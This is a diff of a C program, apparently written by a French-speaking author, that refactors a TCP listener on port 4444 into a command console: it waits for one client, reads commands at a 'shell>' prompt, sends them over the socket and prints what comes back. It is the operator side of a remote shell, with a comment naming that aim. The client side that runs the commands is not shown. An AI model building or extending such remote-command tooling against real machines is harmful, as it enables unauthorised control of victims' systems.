@@ -1,36 +1,14 @@
 #include <stdio.h>
 #include <string.h>
-
-#ifdef _WIN32
-    #include <winsock2.h>
-    #pragma comment(lib, "ws2_32.lib")
-    typedef int socklen_t;
-    #define CLOSE_SOCKET closesocket
-    #define SOCKET_TYPE SOCKET
-    #define INVALID_SOCK INVALID_SOCKET
-    #define SOCKET_ERR SOCKET_ERROR
-    #define INIT_WINSOCK() do { WSADATA w; WSAStartup(MAKEWORD(2,2), &w); } while(0)
-    #define CLEANUP_WINSOCK() WSACleanup()
-#else
-    #include <sys/socket.h>
-    #include <netinet/in.h>
-    #include <arpa/inet.h>
-    #include <unistd.h>
-    #define CLOSE_SOCKET close
-    #define SOCKET_TYPE int
-    #define INVALID_SOCK -1
-    #define SOCKET_ERR -1
-    #define INIT_WINSOCK() do {} while(0)
-    #define CLEANUP_WINSOCK() do {} while(0)
-#endif
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
 
 int main() {
-    INIT_WINSOCK();
-
-    SOCKET_TYPE sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCK) {
+    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == -1) {
         perror("socket");
-        CLEANUP_WINSOCK();
         return 1;
     }
 
@@ -39,17 +17,15 @@ int main() {
     server.sin_addr.s_addr = INADDR_ANY;
     server.sin_port = htons(4444);
 
-    if (bind(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERR) {
+    if (bind(sock, (struct sockaddr*)&server, sizeof(server)) == -1) {
         perror("bind");
-        CLOSE_SOCKET(sock);
-        CLEANUP_WINSOCK();
+        close(sock);
         return 1;
     }
 
-    if (listen(sock, SOMAXCONN) == SOCKET_ERR) {
+    if (listen(sock, SOMAXCONN) == -1) {
         perror("listen");
-        CLOSE_SOCKET(sock);
-        CLEANUP_WINSOCK();
+        close(sock);
         return 1;
     }
 
@@ -57,39 +33,51 @@ int main() {
 
     struct sockaddr_in client_addr;
     socklen_t client_addr_size = sizeof(client_addr);
-    SOCKET_TYPE client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_addr_size);
-    if (client_sock == INVALID_SOCK) {
+    int client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_addr_size);
+    if (client_sock == -1) {
         perror("accept");
-        CLOSE_SOCKET(sock);
-        CLEANUP_WINSOCK();
+        close(sock);
         return 1;
     }
 
     printf("[+] Client connecté !\n");
-    
-    // établir un shell 
-    char cmd[1024] = {0};
-    char test[1024] = {0};
 
-    while(1) {
-        printf("[*] Entrez une commande (ou 'exit' pour quitter): ");
-        fgets(cmd, sizeof(cmd), stdin);
-        cmd[strcspn(cmd, "\n")] = 0; // Remove newline character
-        if (strcmp(cmd, "exit") == 0) {
+    char cmd[1024] = {0};
+    char result[4096] = {0};
+
+    while (1) {
+        printf("shell> ");
+        fflush(stdout);
+        if (fgets(cmd, sizeof(cmd), stdin) == NULL)
+            break;
+
+        cmd[strcspn(cmd, "\n")] = 0;
+
+        if (strcmp(cmd, "exit") == 0)
+            break;
+
+        if (strlen(cmd) == 0)
+            continue;
+
+        if (send(client_sock, cmd, strlen(cmd), 0) == -1) {
+            printf("[!] Erreur d'envoi. Le client est peut-être déconnecté.\n");
             break;
         }
-        send(client_sock, cmd, strlen(cmd), 0);
-        int n = recv(client_sock, test, sizeof(test) - 1, 0);
+
+        int n = recv(client_sock, result, sizeof(result) - 1, 0);
         if (n > 0) {
-            test[n] = '\0';
-            printf("[<] Reçu: %s\n", test);
+            result[n] = '\0';
+            printf("%s", result);
+        } else if (n == 0) {
+            printf("[!] Le client a fermé la connexion.\n");
+            break;
         } else {
-            printf("[!] Aucune réponse du client.\n");
+            printf("[!] Erreur de réception.\n");
+            break;
         }
     }
 
-    CLOSE_SOCKET(client_sock);
-    CLOSE_SOCKET(sock);
-    CLEANUP_WINSOCK();
+    close(client_sock);
+    close(sock);
     return 0;
 }
